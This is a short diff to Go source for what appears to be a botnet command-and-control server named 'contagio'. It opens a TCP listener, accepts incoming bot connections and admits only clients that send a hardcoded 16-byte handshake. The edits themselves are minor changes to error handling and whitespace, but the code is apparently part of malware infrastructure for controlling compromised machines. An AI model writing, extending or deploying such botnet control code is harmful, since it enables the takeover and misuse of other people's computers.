@@ -25,7 +25,6 @@ func StartBotServer(conf *config.Config) {
 	defer catch()
 
 	serv, err := net.Listen("tcp", conf.BotServer)
-
 	if err != nil {
 		fmt.Println("[contagio] Bot server fatal error: " + err.Error())
 		conf.Wg.Done()
@@ -37,7 +36,7 @@ func StartBotServer(conf *config.Config) {
 	for {
 		bot, err := serv.Accept()
 		if err != nil {
-			fmt.Println(err)
+			continue
 		}
 
 		b, inf := initBot(bot)
@@ -99,11 +98,13 @@ func initBot(conn net.Conn) (*Bot, bool) {
 
 	_, err := conn.Read(buf)
 	if err != nil {
+		fmt.Println(err)
 		conn.Close()
 		return &Bot{}, false
 	}
 
 	if !bytes.Equal(buf, []byte{0, 0, 0, 30, 59, 10, 33, 10, 1, 1, 1, 5, 0, 0, 0, 0}) {
+
 		conn.Close()
 		return &Bot{}, false
 	}
